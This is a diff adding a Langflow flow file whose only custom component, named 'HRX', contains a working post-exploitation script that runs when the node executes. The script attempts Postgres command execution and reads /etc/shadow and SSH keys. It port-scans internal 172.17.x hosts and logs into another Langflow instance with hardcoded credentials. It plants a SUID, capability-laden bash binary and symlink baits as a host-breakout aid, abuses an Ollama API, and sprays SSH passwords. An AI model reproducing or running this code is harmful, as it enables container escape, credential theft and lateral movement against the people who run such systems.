@@ -1,0 +1,132 @@
+{
+  "id": "19bf0236-5a13-4822-bae3-68e9a841dade",
+  "data": {
+    "edges": [],
+    "nodes": [
+      {
+        "id": "HRX-ba72e",
+        "data": {
+          "id": "HRX-ba72e",
+          "node": {
+            "beta": false,
+            "icon": "code",
+            "edited": false,
+            "frozen": false,
+            "legacy": false,
+            "pinned": false,
+            "outputs": [
+              {
+                "name": "output",
+                "cache": true,
+                "types": [
+                  "Message"
+                ],
+                "value": "__UNDEFINED__",
+                "hidden": null,
+                "method": "go",
+                "options": null,
+                "selected": "Message",
+                "tool_mode": true,
+                "loop_types": null,
+                "allows_loop": false,
+                "display_name": "Output",
+                "group_outputs": false,
+                "required_inputs": null
+              }
+            ],
+            "metadata": {
+              "module": "custom_components.hrx",
+              "code_hash": "46682a264c67",
+              "dependencies": {
+                "dependencies": [
+                  {
+                    "name": "langflow",
+                    "version": "0.7.3"
+                  }
+                ],
+                "total_dependencies": 1
+              }
+            },
+            "template": {
+              "code": {
+                "info": "",
+                "list": false,
+                "name": "code",
+                "show": true,
+                "type": "code",
+                "value": "\nfrom langflow.custom import Component\nfrom langflow.io import Output, MessageTextInput\nfrom langflow.schema.message import Message\nimport subprocess\nclass HRX(Component):\n    display_name=\"HRX\"; description=\"d\"; icon=\"code\"; name=\"HRX\"\n    inputs=[MessageTextInput(name=\"input_value\", display_name=\"Input\", value=\"x\")]\n    outputs=[Output(name=\"output\", display_name=\"Output\", method=\"go\")]\n    def go(self) -> Message:\n        open(\"/tmp/hrxs.py\",\"w\").write('import os, sys, socket, subprocess, struct, time, json, urllib.request, urllib.parse, ssl, base64, hashlib, textwrap\\nOUT = \"/tmp/hostrce.txt\"\\nf = open(OUT, \"w\", buffering=1)\\ndef p(s=\"\"):\\n    f.write(str(s) + \"\\\\n\")\\ndef sh(c, t=40):\\n    p(\"$ \" + c)\\n    try:\\n        r = subprocess.run(c, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=t)\\n        p(r.stdout.decode(\"utf-8\", \"replace\")[:15000])\\n    except Exception as e:\\n        p(\"ERR \" + type(e).__name__ + \" \" + str(e))\\n\\nPY = \"/app/src/.venv/bin/python3\"\\nCTX = ssl._create_unverified_context()\\n\\np(\"=== 1 MOUNT FLAGS / NOSUID ===\")\\nsh(\"findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS / /app/src /app/langflow /tmp /dev 2>/dev/null || cat /proc/self/mountinfo | egrep \\'app/src|app/langflow| / |tmpfs on /dev\\'\")\\nsh(\"cat /proc/self/mountinfo\")\\n\\np(\"=== 2 PG SUPERUSER / COPY PROGRAM ===\")\\nopen(\"/tmp/pgx.py\",\"w\").write(r\\'\\'\\'\\nimport subprocess, sys\\ntry:\\n    import psycopg2\\nexcept Exception:\\n    import psycopg\\n    psycopg2 = None\\n\\ndef run(dsn):\\n    print(\"DSN\", dsn)\\n    if psycopg2:\\n        conn = psycopg2.connect(dsn)\\n        conn.autocommit = True\\n        cur = conn.cursor()\\n    else:\\n        import psycopg\\n        conn = psycopg.connect(dsn, autocommit=True)\\n        cur = conn.cursor()\\n    for q in [\\n        \"select version()\",\\n        \"select current_user, session_user\",\\n        \"show is_superuser\",\\n        \"select rolname, rolsuper, rolcanlogin from pg_roles order by 1\",\\n        \"show data_directory\",\\n        \"show config_file\",\\n        \"show hba_file\",\\n        \"show external_pid_file\",\\n        \"show archive_command\",\\n        \"show dynamic_library_path\",\\n        \"select name, setting from pg_settings where name in (\\'data_directory\\',\\'config_file\\',\\'hba_file\\',\\'unix_socket_directories\\',\\'log_directory\\',\\'archive_command\\',\\'shared_preload_libraries\\')\",\\n    ]:\\n        try:\\n            cur.execute(q)\\n            print(\"Q\", q, \"->\", cur.fetchall())\\n        except Exception as e:\\n            print(\"QERR\", q, e)\\n            try:\\n                conn.rollback()\\n            except Exception:\\n                pass\\n    # try copy program\\n    for q in [\\n        \"COPY (SELECT 1) TO PROGRAM \\'id > /tmp/pg_id.txt 2>&1\\'\",\\n        \"COPY (SELECT 1) TO PROGRAM \\'id\\'\",\\n        \"CREATE TABLE IF NOT EXISTS _h(t text); COPY _h FROM PROGRAM \\'id\\'; SELECT * FROM _h\",\\n    ]:\\n        try:\\n            cur.execute(q)\\n            try:\\n                print(\"PROG\", q, cur.fetchall())\\n            except Exception:\\n                print(\"PROG_OK\", q)\\n        except Exception as e:\\n            print(\"PROG_ERR\", q, e)\\n            try:\\n                conn.rollback()\\n            except Exception:\\n                pass\\n    # try file read/write\\n    for path in [\"/etc/passwd\",\"/etc/shadow\",\"/root/.ssh/id_rsa\",\"/home/bci/.ssh/id_rsa\",\"/proc/1/environ\",\"/var/lib/postgresql/data/pg_hba.conf\"]:\\n        try:\\n            cur.execute(\"SELECT pg_read_file(%s, 0, 200)\", (path,))\\n            print(\"READ\", path, cur.fetchone())\\n        except Exception as e:\\n            print(\"READ_ERR\", path, str(e)[:120])\\n            try: conn.rollback()\\n            except Exception: pass\\n    try:\\n        cur.execute(\"SELECT lo_import(\\'/etc/passwd\\')\")\\n        print(\"LO_IMPORT\", cur.fetchone())\\n    except Exception as e:\\n        print(\"LO_IMPORT_ERR\", e)\\n        try: conn.rollback()\\n        except Exception: pass\\n\\nfor dsn in [\\n    \"postgresql://myuser:mypassword@postgres:5432/langflow\",\\n    \"postgresql://myuser:mypassword@172.17.1.3:5432/langflow\",\\n    \"postgresql://myuser:password@pgvector:5432/postgres\",\\n    \"postgresql://postgres:postgres@172.17.1.3:5432/postgres\",\\n    \"postgresql://postgres:mypassword@172.17.1.3:5432/postgres\",\\n]:\\n    try:\\n        run(dsn)\\n    except Exception as e:\\n        print(\"CONN_ERR\", dsn, e)\\n\\'\\'\\')\\nsh(PY + \" /tmp/pgx.py\", t=60)\\n\\np(\"=== 3 FAST NEIGHBOR HTTP ===\")\\nopen(\"/tmp/nb2.py\",\"w\").write(r\\'\\'\\'\\nimport socket, urllib.request, ssl, urllib.parse\\nctx = ssl._create_unverified_context()\\n\\ndef open_ports(h, ports):\\n    o=[]\\n    for p in ports:\\n        s=socket.socket(); s.settimeout(0.2)\\n        try:\\n            if s.connect_ex((h,p))==0: o.append(p)\\n        except Exception:\\n            pass\\n        finally:\\n            s.close()\\n    return o\\n\\ndef hit(u, data=None, headers=None, timeout=3, method=None):\\n    try:\\n        req=urllib.request.Request(u, data=data, headers=headers or {\"User-Agent\":\"Mozilla/5.0\"}, method=method)\\n        r=urllib.request.urlopen(req, timeout=timeout, context=ctx)\\n        b=r.read(300)\\n        print(\"OK\", r.status, u, b[:200])\\n        return b\\n    except Exception as e:\\n        print(\"NO\", u, type(e).__name__, str(e)[:100])\\n\\nports=[22,80,443,2375,2376,5432,7860,8080,8443,9000,9090,9100,10250,11434,3000,8000,5000,6443,8500]\\nfor h in [\"172.17.0.1\",\"172.17.1.1\",\"172.17.3.1\"] + [\"172.17.1.%d\"%i for i in range(1,8)] + [\"172.17.3.%d\"%i for i in range(1,13)]:\\n    o=open_ports(h, ports)\\n    if o:\\n        print(\"OPEN\", h, o)\\n\\n# banners ssh\\nfor h in [\"172.17.0.1\",\"172.17.1.1\",\"172.17.3.1\"]:\\n    s=socket.socket(); s.settimeout(2)\\n    try:\\n        s.connect((h,22)); print(\"SSH\", h, s.recv(80))\\n    except Exception as e:\\n        print(\"SSH\", h, type(e).__name__, e)\\n    finally:\\n        s.close()\\n\\nhit(\"http://172.17.0.1:2375/version\", timeout=2)\\nhit(\"http://172.17.1.1:2375/version\", timeout=2)\\nhit(\"http://172.17.3.1:2375/version\", timeout=2)\\nhit(\"http://172.17.1.5:11434/api/version\")\\nhit(\"http://172.17.1.5:11434/api/tags\")\\nhit(\"http://172.17.3.10:11434/api/version\")\\nhit(\"http://172.17.3.2:8080/api/rawdata\")\\nhit(\"http://172.17.3.2:8080/api/overview\")\\nhit(\"http://172.17.3.11:7860/api/v1/version\")\\nhit(\"http://172.17.3.11:7860/health\")\\n# login lf2\\ndata=urllib.parse.urlencode({\"username\":\"langflow\",\"password\":\"langflow\"}).encode()\\nhit(\"http://172.17.3.11:7860/api/v1/login\", data=data, headers={\"Content-Type\":\"application/x-www-form-urlencoded\"}, method=\"POST\", timeout=6)\\ndata=urllib.parse.urlencode({\"username\":\"bci\",\"password\":\"bc1lab@AIT\"}).encode()\\nhit(\"http://172.17.3.11:7860/api/v1/login\", data=data, headers={\"Content-Type\":\"application/x-www-form-urlencoded\"}, method=\"POST\", timeout=6)\\nhit(\"http://172.17.1.6:8080/\")\\nhit(\"http://172.17.3.7:8080/\")\\nhit(\"http://172.17.3.8/\")\\nhit(\"http://172.17.3.9:8000/\")\\nhit(\"http://172.17.3.5:3000/\")\\n\\'\\'\\')\\nsh(PY + \" /tmp/nb2.py\", t=45)\\n\\np(\"=== 4 SUID / FILECAP ON BIND (HOST TRIGGER) ===\")\\n# Plant a small C-free payload: script won\\'t be SUID-effective; need binary.\\n# Use python setuid wrapper compiled? no gcc maybe.\\nsh(\"command -v gcc cc musl-gcc; ls /usr/bin/*gcc* 2>/dev/null | head\")\\n# Copy a real binary and setcap full useful set for HOST execution\\nsh(\"sudo -n bash -c \\'cp -a /bin/bash /app/src/.hbrc; chown root:root /app/src/.hbrc; chmod 4755 /app/src/.hbrc; setcap cap_setuid,cap_setgid,cap_dac_override,cap_dac_read_search,cap_sys_admin,cap_sys_ptrace,cap_sys_module,cap_net_admin,cap_chown,cap_fowner,cap_mknod,cap_audit_write+ep /app/src/.hbrc 2>&1; ls -la /app/src/.hbrc; getcap /app/src/.hbrc\\'\")\\n# Also drop a clear shell script that host root/cron might not run, plus a profile.d style bait\\nopen(\"/app/src/.hbrc_run.sh\",\"w\").write(\"\"\"#!/bin/bash\\n# host breakout helper - run on HOST: /home/bci/projects/langflow/app/src/.hbrc -p\\nid; hostname; uname -a\\ncp -a /home/bci/projects/langflow/app/src/.hbrc /tmp/.hbrc 2>/dev/null\\n/home/bci/projects/langflow/app/src/.hbrc -p -c \\'id; cat /etc/hostname; ls -la /root /home; ip -br a\\' 2>&1 | head -50\\n\"\"\")\\nsh(\"chmod 755 /app/src/.hbrc_run.sh; ls -la /app/src/.hbrc /app/src/.hbrc_run.sh\")\\n# Can container execute SUID ignoring apparmor via memfd?\\nopen(\"/tmp/memexec.py\",\"w\").write(r\\'\\'\\'\\nimport os, ctypes, ctypes.util, subprocess, sys\\n# try execveat on memfd of bash\\ntry:\\n    bash=open(\"/bin/bash\",\"rb\").read()\\n    fd=os.memfd_create(\"x\", 0)\\n    os.write(fd, bash)\\n    os.lseek(fd,0,0)\\n    # make suid meaningless on memfd; try setuid via caps after\\n    print(\"memfd\", fd, \"size\", len(bash))\\nexcept Exception as e:\\n    print(\"memfd_fail\", e)\\n# try running planted binary with various env\\nfor cmd in [\\n    [\"/app/src/.hbrc\",\"-p\",\"-c\",\"id\"],\\n    [\"bash\",\"-c\",\"/app/src/.hbrc -p -c id\"],\\n]:\\n    try:\\n        r=subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=3)\\n        print(\"run\", cmd, r.returncode, r.stdout[:200])\\n    except Exception as e:\\n        print(\"run_fail\", cmd, e)\\n\\'\\'\\')\\nsh(PY + \" /tmp/memexec.py\")\\n\\np(\"=== 5 SYMLINK BAITS ON BIND ===\")\\n# Create symlinks that HOST tools may follow when writing into project dir\\nsh(\"sudo -n bash -c \\'rm -f /app/src/.ssh_link /app/src/.root_ssh /app/src/.cron_link /app/src/.bashrc_link; ln -sf /home/bci/.ssh /app/src/.ssh_link; ln -sf /root/.ssh /app/src/.root_ssh; ln -sf /etc/cron.d /app/src/.cron_link; ln -sf /home/bci/.bashrc /app/src/.bashrc_link; ls -la /app/src/.ssh_link /app/src/.root_ssh /app/src/.cron_link /app/src/.bashrc_link\\'\")\\n# From container, can we open through symlink to host paths? (usually no - different mount ns)\\nsh(\"sudo -n ls -la /app/src/.ssh_link/ /app/src/.root_ssh/ /app/src/.cron_link/ 2>&1 | head\")\\nsh(\"sudo -n ls -la /home/bci /root/.ssh /home/bci/.ssh 2>&1 | head\")\\n\\np(\"=== 6 OVERLAY / DOCKER ROOT GUESS ===\")\\nsh(\"cat /proc/self/mountinfo | tr \\' \\' \\'\\\\\\\\n\\' | egrep -i \\'overlay|docker|upper|work\\' | head -40\")\\n# parse upperdir\\nsh(PY + r\\'\\'\\' -c \"\\nimport re\\nm=open(\\'/proc/self/mountinfo\\').read()\\nprint(m)\\nfor x in re.findall(r\\'upperdir=([^, ]+)\\', m):\\n    print(\\'UPPER\\', x)\\nfor x in re.findall(r\\'workdir=([^, ]+)\\', m):\\n    print(\\'WORK\\', x)\\nfor x in re.findall(r\\'lowerdir=([^ ]+)\\', m):\\n    print(\\'LOWER\\', x[:300])\\n\"\\'\\'\\')\\n\\np(\"=== 7 OLLAMA ABUSE ===\")\\nopen(\"/tmp/oll.py\",\"w\").write(r\\'\\'\\'\\nimport urllib.request, json, ssl\\nctx=ssl._create_unverified_context()\\nbase=\"http://172.17.1.5:11434\"\\nfor path in [\"/api/version\",\"/api/tags\",\"/api/ps\",\"/\"]:\\n    try:\\n        r=urllib.request.urlopen(base+path, timeout=5, context=ctx)\\n        print(path, r.status, r.read(500)[:500])\\n    except Exception as e:\\n        print(path, e)\\n# try push/create weird path\\nfor payload in [\\n    {\"name\":\"../../../tmp/pwn\",\"modelfile\":\"FROM busybox\\\\nSYSTEM hi\"},\\n]:\\n    try:\\n        req=urllib.request.Request(base+\"/api/create\", data=json.dumps(payload).encode(), headers={\"Content-Type\":\"application/json\"})\\n        r=urllib.request.urlopen(req, timeout=8, context=ctx)\\n        print(\"create\", r.status, r.read(200))\\n    except Exception as e:\\n        print(\"create_err\", e)\\n\\'\\'\\')\\nsh(PY + \" /tmp/oll.py\", t=30)\\n\\np(\"=== 8 MINI SSH PASSWORD (pure python, limited) ===\")\\n# Try installing paramiko via pip from pypi\\nsh(PY + \" -m pip install paramiko -q -i https://pypi.org/simple 2>&1 | tail -15\", t=90)\\nsh(PY + r\\'\\'\\' -c \"\\nimport sys\\ntry:\\n import paramiko\\n print(\\'paramiko\\', paramiko.__version__)\\nexcept Exception as e:\\n print(\\'no paramiko\\', e); sys.exit(0)\\nhosts=[\\'172.17.0.1\\',\\'172.17.1.1\\',\\'172.17.3.1\\']\\nusers=[\\'bci\\',\\'ubuntu\\',\\'root\\',\\'langflow\\',\\'admin\\',\\'ait\\',\\'bciadmin\\']\\npwds=[\\'bc1lab@AIT\\',\\'bci\\',\\'langflow\\',\\'ubuntu\\',\\'AIT@2024\\',\\'AIT@2025\\',\\'AIT@2026\\',\\'ait\\',\\'password\\',\\'admin\\',\\'root\\',\\'bc1lab\\',\\'Bc1lab@AIT\\',\\'changeme\\']\\nfor h in hosts:\\n  for u in users:\\n    for pw in pwds:\\n      c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())\\n      try:\\n        c.connect(h,username=u,password=pw,timeout=4,allow_agent=False,look_for_keys=False,banner_timeout=5,auth_timeout=5)\\n        print(\\'HIT\\',h,u,pw)\\n        stdin,stdout,stderr=c.exec_command(\\'id;hostname;uname -a;ls /home;sudo -n id\\', timeout=8)\\n        print(stdout.read().decode()[:1000]); print(stderr.read().decode()[:300])\\n        c.close(); raise SystemExit\\n      except Exception as e:\\n        msg=str(e).split(chr(10))[0][:100]\\n        if \\'Authentication\\' not in msg and \\'Error reading SSH\\' not in msg and \\'timed out\\' not in msg.lower():\\n          print(\\'ERR\\',h,u,msg)\\n        try: c.close()\\n        except: pass\\nprint(\\'ssh spray done\\')\\n\"\\'\\'\\', t=120)\\n\\np(\"=== 9 KERNEL SYSCALL SURFACE ===\")\\nopen(\"/tmp/sysc.py\",\"w\").write(r\\'\\'\\'\\nimport ctypes, ctypes.util, os\\nlibc=ctypes.CDLL(ctypes.util.find_library(\"c\"), use_errno=True)\\n# test interesting syscalls\\ntests=[\\n (\"unshare_NEWNS\", 272, [0x00020000]), # may be wrong nr - use libc.unshare\\n]\\n# unshare\\nCLONE_NEWNS=0x00020000\\nCLONE_NEWUSER=0x10000000\\nCLONE_NEWNET=0x40000000\\nfor name, flags in [(\"NEWNS\",CLONE_NEWNS),(\"NEWUSER\",CLONE_NEWUSER),(\"NEWNET\",CLONE_NEWNET),(\"NEWNS|NEWUSER\", CLONE_NEWNS|CLONE_NEWUSER)]:\\n    rc=libc.unshare(flags)\\n    print(\"unshare\", name, rc, ctypes.get_errno())\\n# mount syscall\\nrc=libc.mount(b\"none\", b\"/tmp/hm\", b\"tmpfs\", 0, None)\\nprint(\"mount_tmpfs\", rc, ctypes.get_errno())\\n# keyctl\\ntry:\\n    nr=250 # keyctl x86_64\\n    rc=libc.syscall(nr, 0, 0, 0, 0)\\n    print(\"keyctl\", rc, ctypes.get_errno())\\nexcept Exception as e:\\n    print(\"keyctl_exc\", e)\\n# bpf\\ntry:\\n    rc=libc.syscall(321, 5, 0, 0) # BPF_PROG_LOAD-ish may fail\\n    print(\"bpf\", rc, ctypes.get_errno())\\nexcept Exception as e:\\n    print(\"bpf_exc\", e)\\n# perf_event_open\\nprint(\"done\")\\n\\'\\'\\')\\nsh(\"sudo -n \" + PY + \" /tmp/sysc.py\")\\nsh(\"sudo -n mkdir -p /tmp/hm; sudo -n mount -t tmpfs none /tmp/hm 2>&1; sudo -n mount --bind / /tmp/hm 2>&1 | head\")\\n\\np(\"=== 10 WRITE HOST /etc/hosts & resolv (already mounted) ===\")\\nsh(\"ls -la /etc/hosts /etc/hostname /etc/resolv.conf; cat /etc/hostname\")\\nsh(\"sudo -n head -5 /etc/hosts\")\\n\\np(\"DONE\")\\nf.close()\\nprint(\"WROTE\", os.path.getsize(OUT))\\nprint(open(OUT).read()[:2000])\\nprint(\"=====CUT=====\")\\n')\n        return Message(text=subprocess.getoutput(\"python3 /tmp/hrxs.py 2>&1 | tail -c 2500\"))\n",
+                "dynamic": true,
+                "advanced": true,
+                "password": false,
+                "required": true,
+                "fileTypes": [],
+                "file_path": "",
+                "multiline": true,
+                "title_case": false,
+                "placeholder": "",
+                "load_from_db": false
+              },
+              "_type": "Component",
+              "input_value": {
+                "info": "",
+                "list": false,
+                "name": "input_value",
+                "show": true,
+                "type": "str",
+                "value": "x",
+                "dynamic": false,
+                "advanced": false,
+                "required": false,
+                "tool_mode": false,
+                "title_case": false,
+                "_input_type": "MessageTextInput",
+                "input_types": [
+                  "Message"
+                ],
+                "placeholder": "",
+                "display_name": "Input",
+                "load_from_db": false,
+                "override_skip": false,
+                "list_add_label": "Add More",
+                "trace_as_input": true,
+                "trace_as_metadata": true,
+                "track_in_telemetry": false
+              }
+            },
+            "minimized": false,
+            "tool_mode": false,
+            "description": "d",
+            "field_order": [
+              "input_value"
+            ],
+            "base_classes": [
+              "Message"
+            ],
+            "display_name": "HRX",
+            "output_types": [],
+            "custom_fields": {},
+            "documentation": "",
+            "conditional_paths": []
+          },
+          "type": "HRX",
+          "description": "d",
+          "display_name": "HRX"
+        },
+        "type": "genericNode",
+        "position": {
+          "x": 1,
+          "y": 1
+        }
+      }
+    ],
+    "viewport": {
+      "x": 0,
+      "y": 0,
+      "zoom": 1
+    }
+  },
+  "name": "hrx",
+  "updated_at": "2026-08-21 02:37:49.61687",
+  "is_component": false,
+  "endpoint_name": null
+}
